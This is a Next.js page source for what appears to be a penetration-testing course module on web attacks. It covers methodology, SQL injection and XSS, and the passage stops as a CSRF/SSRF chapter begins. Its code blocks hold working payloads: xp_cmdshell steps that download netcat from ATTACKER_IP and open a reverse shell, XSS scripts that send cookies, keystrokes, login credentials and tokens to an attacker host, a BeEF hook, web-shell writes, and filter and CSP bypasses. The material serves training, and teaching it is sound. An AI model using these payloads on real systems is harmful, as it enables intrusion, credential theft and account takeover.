'use client'
import React from 'react'
import Link from 'next/link'
import ModuleCodex, { CodexChapter } from '../../components/ModuleCodex'

const accent = '#00d4ff'
const mono = 'JetBrains Mono, monospace'

const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: mono, fontSize: '9px', color: '#2a5a6a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#020810', border: '1px solid #003a4a', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: mono, fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const H3 = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontFamily: mono, fontSize: '0.85rem', fontWeight: 600, color: '#0099bb', marginTop: '1.75rem', marginBottom: '0.6rem' }}>&#9658; {children}</h3>
)
const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ color: '#8a9a9a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.88rem' }}>{children}</p>
)
const Note = ({ type = 'info', children }: { type?: 'info' | 'warn' | 'danger' | 'tip'; children: React.ReactNode }) => {
  const cfg: Record<string, [string, string]> = {
    info:   ['#00d4ff', 'NOTE'],
    warn:   ['#ffb347', 'WARNING'],
    danger: ['#ff4136', 'CRITICAL'],
    tip:    ['#00ff41', 'PRO TIP'],
  }
  const [c, lbl] = cfg[type]
  return (
    <div style={{ background: c + '08', border: '1px solid ' + c + '33', borderLeft: '3px solid ' + c, borderRadius: '0 4px 4px 0', padding: '1rem 1.25rem', margin: '1.25rem 0' }}>
      <div style={{ fontFamily: mono, fontSize: '9px', color: c, letterSpacing: '0.2em', marginBottom: '6px' }}>{lbl}</div>
      <div style={{ color: '#8a9a9a', fontSize: '0.83rem', lineHeight: 1.7 }}>{children}</div>
    </div>
  )
}
const Table = ({ headers, rows }: { headers: string[]; rows: string[][] }) => (
  <div style={{ overflowX: 'auto', margin: '1rem 0 1.5rem' }}>
    <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: mono, fontSize: '0.75rem' }}>
      <thead>
        <tr style={{ borderBottom: '1px solid #003a4a' }}>
          {headers.map((h, i) => <th key={i} style={{ textAlign: 'left', padding: '8px 12px', color: '#0099bb', fontWeight: 600, letterSpacing: '0.1em', fontSize: '0.7rem' }}>{h}</th>)}
        </tr>
      </thead>
      <tbody>
        {rows.map((row, i) => (
          <tr key={i} style={{ borderBottom: '1px solid #001a22', background: i % 2 === 0 ? 'transparent' : 'rgba(0,212,255,0.015)' }}>
            {row.map((cell, j) => <td key={j} style={{ padding: '8px 12px', color: '#8a9a9a', verticalAlign: 'top' }}>{cell}</td>)}
          </tr>
        ))}
      </tbody>
    </table>
  </div>
)

const chapters: CodexChapter[] = [
  {
    id: 'wa-01',
    title: 'Web Application Testing Methodology',
    difficulty: 'BEGINNER',
    readTime: '14 min',
    labLink: '/modules/web-attacks/lab',
    takeaways: [
      'OWASP Top 10 2021 is the canonical reference list for web app risk categories - not a complete vuln list',
      'Burp Suite Pro is the industry-standard proxy; learn every tab before calling yourself a web tester',
      'Establish scope and target mapping BEFORE active scanning to avoid missing attack surface',
      'HTTP security headers (CSP, HSTS, CORS, X-Frame-Options) reveal the security maturity of the target',
      'API testing (REST, GraphQL, gRPC) requires different tooling and mindset from traditional web testing',
    ],
    content: (
      <div>
        <P>Web application testing is the largest subdomain of offensive security. Every modern organisation runs web apps, APIs, and microservices - all of which carry their own attack surface. This chapter covers the methodology, tooling, and conceptual framework you need before touching any target.</P>
        <H3>OWASP Top 10 2021 - Full Breakdown</H3>
        <P>The OWASP Top 10 is a community-consensus document listing the most critical web application security risks. The 2021 edition reorganised categories significantly. It is a risk classification, not a vulnerability checklist - each category contains dozens of specific vulnerability classes.</P>
        <Table
          headers={['Rank', 'Category', 'What It Covers', 'Key Examples']}
          rows={[
            ['A01', 'Broken Access Control', 'Failures in enforcing what authenticated users are allowed to do', 'IDOR, privilege escalation, CORS misconfig, path traversal to protected files'],
            ['A02', 'Cryptographic Failures', 'Sensitive data exposed due to weak or absent encryption', 'HTTP instead of HTTPS, MD5 passwords, weak TLS, hardcoded secrets in code'],
            ['A03', 'Injection', 'Untrusted data sent to an interpreter as a command or query', 'SQL injection, command injection, LDAP injection, XSS, template injection'],
            ['A04', 'Insecure Design', 'Architectural flaws - not just implementation bugs', 'No rate limiting on auth, missing business logic controls, trusting client-side checks'],
            ['A05', 'Security Misconfiguration', 'Default configs, unnecessary features, verbose error messages', 'Default creds, exposed stack traces, open S3 buckets, debug endpoints in prod'],
            ['A06', 'Vulnerable Components', 'Using libraries/frameworks with known CVEs', 'Log4Shell via log4j, old jQuery, outdated OpenSSL, unpatched CMS plugins'],
            ['A07', 'Auth and Session Failures', 'Broken authentication and session management', 'Weak passwords, no MFA, predictable session tokens, session fixation'],
            ['A08', 'Software/Data Integrity Failures', 'Code and infrastructure not protected from integrity violations', 'Insecure deserialization, unsigned software updates, CI/CD pipeline injection'],
            ['A09', 'Security Logging Failures', 'Insufficient logging and monitoring enables attackers to persist', 'No audit logs, no alerting on brute force, logs not protected from tampering'],
            ['A10', 'SSRF', 'Server-side request forgery - server makes requests on behalf of attacker', 'AWS metadata access, internal port scanning, Redis/Elasticsearch exploitation'],
          ]}
        />
        <H3>Web App Testing Methodology</H3>
        <Pre label="// PHASE 1: PASSIVE RECON - NO ACTIVE PROBING YET">{`# Technology fingerprinting:
whatweb https://TARGET_URL              # identifies CMS, framework, server
wappalyzer (browser extension)          # same but in browser
curl -I https://TARGET_URL              # grab response headers

# DNS / subdomain enumeration:
subfinder -d target.com -o subs.txt
amass enum -passive -d target.com
# Look for: dev., staging., admin., api., beta., old., internal.

# Certificate transparency (no active probing needed):
curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value'

# Search engine dorking (passive):
# site:target.com ext:php
# site:target.com inurl:admin
# site:target.com "error" OR "exception" OR "stack trace"

# Wayback Machine - find old endpoints:
# https://web.archive.org/web/*/target.com/*
# waybackurls target.com | tee wayback.txt`}</Pre>
        <Pre label="// PHASE 2: ACTIVE MAPPING - ENUMERATE ATTACK SURFACE">{`# Directory and file brute-force:
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://TARGET_URL/FUZZ
gobuster dir -u https://TARGET_URL -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt

# Parameter discovery:
arjun -u https://TARGET_URL/endpoint -oT params.txt
# or: ffuf -w params_wordlist.txt -u "https://TARGET_URL/?FUZZ=1"

# API endpoint discovery:
kiterunner scan https://TARGET_URL -w routes-large.kite

# JS file mining for secrets and hidden endpoints:
# Download all .js files, grep for: api_key, token, password, endpoint, /api/
gau target.com | grep "\.js$" | sort -u | tee js_files.txt`}</Pre>
        <H3>Burp Suite Pro - Complete Workflow</H3>
        <Pre label="// BURP SUITE CORE WORKFLOW">{`# 1. PROXY SETUP
# Burp: Proxy > Options > Proxy Listeners > 127.0.0.1:8080
# Browser: set proxy to 127.0.0.1:8080
# Install Burp CA cert: http://burpsuite > CA Certificate > import in browser

# 2. TARGET SCOPE
# Target > Scope > Add > Enter target domain
# Proxy > Options > "Intercept requests based on rules" > check "is in scope"
# This prevents capturing noise from ad networks/CDNs

# 3. SPIDERING / CRAWLING
# Target > Site map: right-click target > Scan (or Spider in older versions)
# Passively crawls via proxy traffic
# Engagement tools > Find references (searches JS for endpoints)

# 4. SCANNER (Pro only)
# Right-click any request > Scan
# Scanner > Dashboard: live issue feed
# Issue types: Active (probes) vs Passive (header analysis)

# 5. INTRUDER - automated fuzzing
# Capture request > Send to Intruder (Ctrl+I)
# Positions tab: highlight payload position > Add marker
# Payloads tab: choose list type (Simple list, Numbers, Cluster bomb, Pitchfork)
# Cluster bomb: all combos of multiple wordlists (e.g. user + password brute force)
# Pitchfork: parallel - position 1 from list A, position 2 from list B (credential stuffing)

# 6. REPEATER - manual request modification
# Send to Repeater (Ctrl+R)
# Modify headers, body, cookies, method
# Compare responses with Comparer

# 7. DECODER
# Decode/encode: URL, Base64, HTML, Hex, Gzip, ZLIB
# Smart decode: auto-detects encoding layers

# 8. SEQUENCER - token entropy analysis
# Load a session token generation request
# Captures tokens and analyses randomness (FIPS 140-2 tests)
# Low entropy = predictable session tokens = account takeover

# 9. COMPARER
# Word/byte diff between two requests or responses
# Detect subtle differences in blind injection responses`}</Pre>
        <Pre label="// KEY BURP EXTENSIONS">{`# Install via Extensions > BApp Store

# ActiveScan++ - augments scanner with extra checks
# Turbo Intruder - high-speed fuzzing (Python scripts, race condition testing)
# Autorize - automatically tests all requests as a lower-privileged user
#   → Add low-priv cookie → Autorize replays every request with low-priv creds
#   → Red = access granted (should be forbidden) = broken access control
# Param Miner - discovers unlinked parameters via header/body injection
# J2EEScan - Java EE specific checks (Struts, JBoss, WebLogic, JMX)
# Collaborator Everywhere - injects Burp Collaborator payloads into all headers
#   → Detects blind SSRF, blind XXE, DNS rebinding vulnerabilities
# HTTP Request Smuggler - desync attack detection and exploitation
# JWT Editor - full JWT attack suite (none alg, key confusion, crack)
# InQL - GraphQL introspection, query generation, scanning`}</Pre>
        <H3>HTTP Security Headers Analysis</H3>
        <Table
          headers={['Header', 'Purpose', 'Missing = Vulnerable To', 'Secure Value']}
          rows={[
            ['Content-Security-Policy', 'Restricts resource loading origins', 'XSS via inline scripts or external CDNs', "default-src 'self'; script-src 'self'"],
            ['Strict-Transport-Security', 'Forces HTTPS for a duration', 'SSL stripping, downgrade attacks', 'max-age=31536000; includeSubDomains'],
            ['X-Frame-Options', 'Prevents iframe embedding', 'Clickjacking attacks', 'DENY or SAMEORIGIN'],
            ['X-Content-Type-Options', 'Prevents MIME sniffing', 'Content type confusion attacks', 'nosniff'],
            ['Access-Control-Allow-Origin', 'CORS policy', 'Cross-origin data theft if wildcard', 'Specific origin, not *'],
            ['Referrer-Policy', 'Controls Referer header value', 'Information leakage via Referer', 'strict-origin-when-cross-origin'],
            ['Permissions-Policy', 'Restricts browser features', 'Geolocation/camera/mic abuse', 'geolocation=(), camera=()'],
          ]}
        />
        <H3>API Testing Overview</H3>
        <Pre label="// DIFFERENCES IN API TESTING APPROACH">{`# REST API
# - Endpoints: /api/v1/users, /api/v1/orders/ORD_ID
# - Auth: Bearer token in Authorization header, API key in header or param
# - Test: verb tampering (GET->POST->DELETE), versioning (v1->v2->v0)
# - Tool: Burp Suite, Postman, ffuf for endpoint discovery

# GraphQL
# - Single endpoint: /graphql or /api/graphql
# - All requests are POST with JSON body containing "query" field
# - Test: introspection, batching, depth attacks, field suggestions
# - Tool: InQL (Burp), GraphQL Voyager, Altair

# SOAP / XML Web Services
# - WSDL file describes all operations: TARGET_URL?wsdl
# - All messages are XML - test for XXE inside SOAP body
# - Tool: SOAPUI, Burp (intercept and modify XML)

# gRPC
# - Uses Protocol Buffers (binary) not JSON - need to decode .proto files
# - Find .proto files in APKs, JS bundles, GitHub repos
# - Tools: grpcurl (curl for gRPC), grpcui (web UI), BloomRPC
grpcurl -plaintext TARGET_HOST:PORT list         # list services
grpcurl -plaintext TARGET_HOST:PORT describe svc  # describe methods
grpcurl -d '{"user_id": "1"}' TARGET_HOST:PORT service.Method`}</Pre>
        <Note type="tip">OWASP ZAP is the free alternative to Burp Pro. Use ZAP for CI/CD pipeline integration (DAST in automation), and Burp for manual testing. ZAP has better scripting support for custom scan rules; Burp has superior manual request manipulation.</Note>
      </div>
    ),
  },
  {
    id: 'wa-02',
    title: 'SQL Injection - Complete Guide',
    difficulty: 'INTERMEDIATE',
    readTime: '18 min',
    labLink: '/modules/web-attacks/lab',
    takeaways: [
      'SQLi types: in-band (error/union), blind (boolean/time), out-of-band - each requires different extraction technique',
      'Always determine column count (ORDER BY) and data types before union-based extraction',
      'MSSQL xp_cmdshell is the fastest path from SQLi to OS command execution on Windows',
      'SQLMap --tamper scripts are essential for WAF bypass - combine multiple tampers with commas',
      'NoSQL injection uses operator injection ($gt, $where, $regex) not SQL syntax - different payloads required',
    ],
    content: (
      <div>
        <P>SQL injection has existed since the 1990s and remains in the OWASP Top 10 because developers continue to concatenate user input into queries. A single SQLi vulnerability can result in full database extraction, authentication bypass, file system access, and sometimes OS command execution.</P>
        <H3>Detection - Finding the Injection Point</H3>
        <Pre label="// DETECTION PAYLOADS">{`# Start with a single quote - causes a syntax error if input is unsanitised:
'
''
&#96;
"
")
'))
--
-- -
#
/* */
;--

# Boolean detection - TRUE vs FALSE condition changes response:
' OR 1=1--    (if login page: bypasses auth)
' OR 1=2--    (should return nothing / error)
1 AND 1=1     (same result as 1)
1 AND 1=2     (different result = boolean injection confirmed)

# Time-based detection (blind, no output difference):
' OR SLEEP(5)--        # MySQL: delays 5 seconds if vulnerable
'; WAITFOR DELAY '0:0:5'--   # MSSQL
' OR pg_sleep(5)--     # PostgreSQL
' OR 1=1 AND SLEEP(5)--`}</Pre>
        <H3>Union-Based SQL Injection</H3>
        <Pre label="// UNION-BASED EXTRACTION - STEP BY STEP">{`# Step 1: Determine number of columns using ORDER BY
# Increment until error:
' ORDER BY 1--    # no error
' ORDER BY 2--    # no error
' ORDER BY 3--    # no error
' ORDER BY 4--    # ERROR = 3 columns exist

# Step 2: Find which columns are reflected in output
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a','b','c'--    # see which appears in page

# Step 3: Extract database info (MySQL example)
' UNION SELECT database(),user(),version()--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password,email FROM users--

# MSSQL equivalent:
' UNION SELECT DB_NAME(),USER,@@VERSION--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT name,NULL,NULL FROM sys.databases--

# PostgreSQL:
' UNION SELECT current_database(),current_user,version()--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--`}</Pre>
        <H3>Error-Based SQL Injection</H3>
        <Pre label="// ERROR-BASED EXTRACTION (MySQL)">{`# extractvalue() abuses XPath parsing to surface data in error message:
' AND extractvalue(1,concat(0x7e,(SELECT database())))--
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE username='admin' LIMIT 1)))--

# updatexml() alternative:
' AND updatexml(1,concat(0x7e,(SELECT database())),1)--

# MSSQL error-based:
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' UNION SELECT 1,2,3 WHERE 1=CONVERT(int,(SELECT TOP 1 password FROM users))--`}</Pre>
        <H3>Blind SQL Injection - Boolean Based</H3>
        <Pre label="// BOOLEAN-BASED BLIND - CHARACTER EXTRACTION">{`# The page behaves differently for TRUE vs FALSE conditions
# Use this to extract data character by character

# Is first character of database name 'a'?
' AND (SELECT SUBSTRING(database(),1,1))='a'--
# Is first character ASCII value > 109?
' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>109--

# Binary search approach (faster):
# ASCII range 32-127
# > 79? yes -> > 103? yes -> > 115? no -> > 109? yes -> = 110 = 'n'

# Extract admin password char by char:
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')=97--`}</Pre>
        <H3>Time-Based Blind SQLi</H3>
        <Pre label="// TIME-BASED BLIND - ALL DATABASES">{`# MySQL:
' AND IF(1=1,SLEEP(5),0)--
' AND IF((SELECT SUBSTRING(database(),1,1))='n',SLEEP(5),0)--

# MSSQL:
'; IF (SELECT COUNT(*) FROM users WHERE username='admin')>0 WAITFOR DELAY '0:0:5'--
'; IF (ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>97) WAITFOR DELAY '0:0:3'--

# PostgreSQL:
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--

# Oracle (heavy query - no SLEEP function):
' AND 1=(SELECT COUNT(*) FROM all_objects,all_objects,all_objects WHERE ROWNUM<100)--`}</Pre>
        <H3>MSSQL xp_cmdshell - OS Command Execution</H3>
        <Pre label="// MSSQL - FROM SQLi TO OS SHELL">{`# xp_cmdshell disabled by default in modern MSSQL but can be re-enabled:
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--

# Execute OS commands:
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'certutil -urlcache -f http://ATTACKER_IP/nc.exe C:\nc.exe'--
'; EXEC xp_cmdshell 'C:\nc.exe -e cmd.exe ATTACKER_IP 4444'--

# Read files:
'; EXEC xp_cmdshell 'type C:\Windows\System32\drivers\etc\hosts'--

# Write files (via bulk insert or bcp):
'; EXEC xp_cmdshell 'echo PAYLOAD_HERE > C:\inetpub\wwwroot\shell.aspx'--`}</Pre>
        <H3>MySQL File Read / Write</H3>
        <Pre label="// MYSQL FILE OPERATIONS VIA SQLi">{`# Read files (requires FILE privilege):
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL,NULL--

# Write files (requires FILE + write access to web root):
' UNION SELECT '' INTO OUTFILE '/var/www/html/shell.php'--
' INTO DUMPFILE '/var/www/html/shell.php'--
# Note: INTO DUMPFILE writes binary without line feeds (needed for binary files)
# INTO OUTFILE adds line terminators (text files only)`}</Pre>
        <H3>SQLMap - Automated Exploitation</H3>
        <Pre label="// SQLMAP COMPLETE USAGE">{`# Basic detection and extraction:
sqlmap -u "https://TARGET_URL/page?id=1" --dbs
sqlmap -u "https://TARGET_URL/page?id=1" -D dbname --tables
sqlmap -u "https://TARGET_URL/page?id=1" -D dbname -T users --dump

# POST request (from saved Burp request file):
sqlmap -r request.txt --dbs

# Cookie-based injection:
sqlmap -u "https://TARGET_URL/" --cookie="session=VALUE_HERE" -p session

# Specific DBMS and technique:
sqlmap -u "https://TARGET_URL/page?id=1" --dbms=mysql --technique=BEUSTQ

# OS interaction:
sqlmap -u "https://TARGET_URL/page?id=1" --os-shell     # interactive OS shell
sqlmap -u "https://TARGET_URL/page?id=1" --file-read="/etc/passwd"
sqlmap -u "https://TARGET_URL/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# WAF bypass with tamper scripts (stack multiple with commas):
sqlmap -u "https://TARGET_URL/page?id=1" --tamper=space2comment,between,randomcase,charencode
sqlmap -u "https://TARGET_URL/page?id=1" --tamper=space2comment,greatest --level=5 --risk=3

# Useful tamper scripts:
# space2comment   -> replaces spaces with /**/
# between         -> replaces > with NOT BETWEEN 0 AND
# randomcase      -> sElEcT iNsTeAd Of SELECT (case bypass)
# charencode      -> URL encodes characters
# hex2char        -> replaces hex strings with CHAR() equivalent
# equaltolike     -> replaces = with LIKE
# greatest        -> replaces > with GREATEST()
# unionalltounion -> replaces UNION ALL SELECT with UNION SELECT`}</Pre>
        <H3>NoSQL Injection - MongoDB</H3>
        <Pre label="// NOSQL INJECTION - MONGODB OPERATOR ABUSE">{`# MongoDB uses JSON-like query operators instead of SQL
# Injection via operator substitution in JSON body:

# Login bypass - replace string with $gt operator:
# Normal:  {"username": "admin", "password": "password"}
# Injected: {"username": "admin", "password": {"$gt": ""}}
# $gt: "" matches any non-empty string = auth bypass

# $regex for enumeration:
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^pa"}}
# Iterate to extract password character by character

# $where clause injection (allows JavaScript):
{"username": "admin", "$where": "this.password.match(/^a/)"}
{"$where": "sleep(5000)"}    # time-based blind

# URL parameter injection:
# TARGET_URL/api/user?username=admin&password[$gt]=
# TARGET_URL/api/search?q[$regex]=.*&q[$options]=i`}</Pre>
        <H3>Second-Order (Stored) SQL Injection</H3>
        <Pre label="// SECOND-ORDER SQLI">{`# Payload is stored in DB (sanitised on input) but used unsafely later
# Example: registration stores username with quotes
# Username: admin'--
# Later, the app runs: SELECT * FROM users WHERE username='admin'--'
# The '--' comments out the rest of the query

# Detection: hard - requires following data flow through the application
# Register with SQL payload as username/email/profile field
# Trigger the path that uses stored data in a query
# Look for errors or behaviour changes downstream`}</Pre>
        <Note type="warn">SQLMap with --os-shell and --level=5 --risk=3 generates significant traffic and may cause disruption. Always get explicit written permission and test during change windows when targeting production systems.</Note>
      </div>
    ),
  },
  {
    id: 'wa-03',
    title: 'XSS - All Variants and Exploitation',
    difficulty: 'INTERMEDIATE',
    readTime: '16 min',
    labLink: '/modules/web-attacks/lab',
    takeaways: [
      'DOM-based XSS never touches the server - it cannot be caught by server-side WAFs or output encoding alone',
      'Stored XSS in admin panels is critical - it delivers payload to privileged users who can change passwords, add accounts',
      'CSP bypass via JSONP endpoints or CDN whitelists is common in real-world targets',
      'BeEF browser hooking enables network scanning from inside the victim\'s browser - bypasses external firewalls',
      'XSS chained with CSRF creates account takeover without stealing cookies if HttpOnly is set',
    ],
    content: (
      <div>
        <P>Cross-Site Scripting allows attackers to inject and execute JavaScript in victim browsers. Despite being well-known, XSS remains extremely common. Modern exploitation goes far beyond alert(1) - a working XSS in the right place can result in full account takeover, internal network reconnaissance, and keylogging.</P>
        <H3>Reflected XSS</H3>
        <Pre label="// REFLECTED XSS - DETECTION AND BASIC PAYLOADS">{`# Reflected XSS: payload is in the request, reflected in the response
# Appears in: search queries, error messages, URL params, POST body fields

# Step 1: find reflection point
# Try: <h1>TEST_MARKER</h1>
# If TEST_MARKER appears in source with < or > encoded -> might be safe
# If it appears literally -> potential XSS

# Basic test payloads:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
</script><script>alert(1)</script>

# Context matters - where does your input land?
# In HTML body:       <div>INPUT_HERE</div>   -> script/img tag
# In HTML attribute:  <img alt="INPUT_HERE">  -> " onmouseover=alert(1) x="
# In JavaScript:      var x = 'INPUT_HERE';   -> '; alert(1); var y='
# In URL:             href="INPUT_HERE"        -> javascript:alert(1)
# In CSS:             color: INPUT_HERE        -> red; } body { background: url(javascript:alert(1))`}</Pre>
        <H3>Stored XSS</H3>
        <Pre label="// STORED XSS - HIGH IMPACT TARGETS">{`# Stored XSS persists in the database and fires for every visitor
# Highest impact targets:
# - Comment sections visited by admins
# - User profile fields displayed in admin panels
# - Support ticket body visible to support staff
# - Product reviews shown on main pages

# Cookie stealing payload (basic):
<script>document.location='http://ATTACKER_IP/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://ATTACKER_IP/?c='+document.cookie)">

# Keylogger payload:
<script>
document.onkeypress=function(e){
  fetch('http://ATTACKER_IP/log?k='+String.fromCharCode(e.which))
}
</script>

# BeEF hook payload:
<script src="http://ATTACKER_IP:3000/hook.js"></script>

# Capture credentials from login form:
<script>
window.onload=function(){
  var f=document.forms[0];
  f.onsubmit=function(){
    fetch('http://ATTACKER_IP/?u='+f.username.value+'&p='+f.password.value);
  }
}
</script>`}</Pre>
        <H3>DOM-Based XSS</H3>
        <Pre label="// DOM XSS - SOURCES AND SINKS">{`# DOM XSS: payload never hits the server - only in client-side JavaScript
# Source: where attacker-controlled data enters the DOM
# Sink: where data is used in a dangerous way

# Common SOURCES:
# location.hash         -> TARGET_URL#PAYLOAD
# location.search       -> TARGET_URL?q=PAYLOAD
# location.href         -> full URL including fragment
# document.referrer     -> previous page URL
# window.name           -> persists across navigations
# postMessage data      -> cross-origin messages

# Common SINKS (dangerous functions):
# innerHTML/outerHTML   -> writes raw HTML
# document.write()      -> writes raw HTML
# eval()                -> executes JavaScript string
# setTimeout/setInterval with string arg
# location.href = "..."  -> can set javascript: URI
# element.src = "..."    -> can set javascript: URI
# jQuery $() with string
# jQuery .html() .append()

# Example vulnerable pattern:
# var search = location.hash.substring(1);
# document.getElementById('output').innerHTML = search;
# Exploit: TARGET_URL#<img src=x onerror=alert(1)>

# DOM XSS via postMessage:
# App listens: window.addEventListener('message', function(e){ eval(e.data) })
# Exploit: open iframe, postMessage('alert(1)', '*')`}</Pre>
        <H3>XSS Filter and WAF Bypass</H3>
        <Pre label="// BYPASS TECHNIQUES">{`# Case variation:
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x onerror=alert(1)>

# Alternative tags (when script is blocked):
<svg/onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<math><mtext></p><img src=x onerror=alert(1)>
<details/open/ontoggle=alert(1)>

# HTML entity encoding in attributes:
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

# URL encoding in href context:
<a href="javascript:%61%6c%65%72%74%28%31%29">click</a>

# Double encoding (when server decodes once then reflects):
%253Cscript%253Ealert(1)%253C/script%253E

# Null bytes between characters (old filters):
<scr\x00ipt>alert(1)</scr\x00ipt>

# Template literal in JS context (backtick for string):
';alert(1)//
&#96;-alert(1)-&#96;

# SVG with base64 href:
<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0ieCI+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pjwvc3ZnPg==">

# XSStrike - automated bypass:
python3 xsstrike.py -u "https://TARGET_URL/?q=PAYLOAD_HERE" --blind
# dalfox:
dalfox url "https://TARGET_URL/?q=PAYLOAD_HERE"`}</Pre>
        <H3>CSP Bypass Techniques</H3>
        <Pre label="// CONTENT SECURITY POLICY BYPASS">{`# First: read the CSP header to understand what's allowed
# Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jquery.com

# Bypass 1: 'unsafe-inline' in script-src
# CSP: script-src 'unsafe-inline' 'self'
# -> inline <script> tags work = no XSS protection

# Bypass 2: 'unsafe-eval' in script-src
# CSP: script-src 'unsafe-eval' 'self'
# -> eval(), Function(), setTimeout('string') work

# Bypass 3: CDN whitelist abuse
# CSP: script-src 'self' https://cdn.jsdelivr.net
# -> find JSONP endpoint on cdn.jsdelivr.net:
# <script src="https://cdn.jsdelivr.net/JSONP_ENDPOINT?callback=alert(1)"></script>
# or upload malicious JS to CDN (npm package on jsdelivr)

# Bypass 4: JSONP callback injection
# CSP: script-src 'self' https://accounts.google.com
# Google has JSONP endpoints:
# <script src="https://accounts.google.com/o/oauth2/revoke?token=alert(1)"></script>

# Bypass 5: base-uri missing
# If CSP has no base-uri directive:
# <base href="https://ATTACKER_IP/">
# Relative script src loads from attacker server

# Bypass 6: object-src missing or wildcard
# <object data="data:text/html,<script>alert(1)</script>"></object>

# Bypass 7: script nonce/hash leak
# If nonce is reused or predictable across requests -> include it in your payload`}</Pre>
        <H3>XSS to Account Takeover</H3>
        <Pre label="// COOKIE THEFT AND ATO VIA XSS">{`# Method 1: Cookie theft (works if HttpOnly NOT set)
<script>
fetch('https://ATTACKER_IP/steal?cookie=' + encodeURIComponent(document.cookie))
</script>

# Method 2: Extract CSRF token + chain with CSRF (HttpOnly cookies OK)
<script>
fetch('/account/settings').then(r=>r.text()).then(body=>{
  var token = body.match(/csrf_token[^>]*value="([^"]+)"/)[1];
  fetch('/account/change-email', {
    method: 'POST',
    body: 'email=attacker@evil.com&csrf_token='+token,
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    credentials: 'include'
  });
});
</script>

# Method 3: Password change via XSS
# Extract current page's CSRF token, submit password change form
# If no current password required = instant ATO

# Method 4: Extract JWT/bearer token from localStorage
<script>
fetch('https://ATTACKER_IP/?t=' + localStorage.getItem('auth_token'));
</script>

# Self-XSS + CSRF chain:
# Self-XSS: only fires for the user themselves (requires victim to paste payload)
# Chain: CSRF loads the self-XSS page -> payload fires in victim's context
# Escalates self-XSS to stored XSS impact`}</Pre>
        <H3>File Upload XSS and BeEF</H3>
        <Pre label="// SVG XSS AND BEEF HOOKING">{`# SVG XSS - upload SVG file containing script:
# file: evil.svg
# <?xml version="1.0"?>
# <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
# <circle cx="50" cy="50" r="40"/>
# </svg>
# When browser renders the SVG directly -> XSS fires

# HTML file upload XSS:
# If app allows HTML uploads and serves them from same origin:
# Upload file.html containing: <script>alert(document.cookie)</script>

# Mutation XSS (mXSS):
# Browser's HTML parser mutates your sanitised payload back to dangerous form
# Example: <p><img src=x></p> in certain contexts
# Different browsers mutate differently - test in target browser version

# BeEF - Browser Exploitation Framework:
# Install: git clone https://github.com/beefproject/beef
# Start: ./beef
# Default UI: http://127.0.0.1:3000/ui/panel (admin/admin -> change immediately)
# Hook: inject <script src="http://ATTACKER_IP:3000/hook.js"></script>

# BeEF modules once hooked:
# Network > Port Scanner (scan victim's internal network via browser)
# Network > Fingerprint Network (identify internal hosts)
# Social Engineering > Fake Login Prompt (overlay credential phish)
# Browser > Webcam (request camera permission)
# Browser > Get Cookie (retrieve non-HttpOnly cookies)
# Misc > iFrame (load external page in BeEF iframe)`}</Pre>
        <Note type="danger">XSS payloads that exfiltrate cookies or perform actions on behalf of users constitute unauthorized access under most computer crime laws. Only test on systems you own or have explicit written authorization to test.</Note>
      </div>
    ),
  },
  {
    id: 'wa-04',
    title: 'CSRF, SSRF and Request Forgery',
    difficulty: 'INTERMEDIATE',
    readTime: '15 min',
    labLink: '/modules/web-attacks/lab',
    takeaways: [
      'AWS IMDSv1 is critically exploitable via SSRF - a single request returns permanent IAM credentials',
      'SameSite=Strict is the strongest CSRF defence but has exceptions on old browsers and subdomain attacks',
      'SSRF via PDF generators and webhooks is common because developers forget these features make outbound requests',
      'Blind SSRF requires out-of-band detection via Burp Collaborator or interactsh',
      'SSRF to Redis or Memcached can achieve RCE by writing malicious data to the cache that gets executed',
    ],
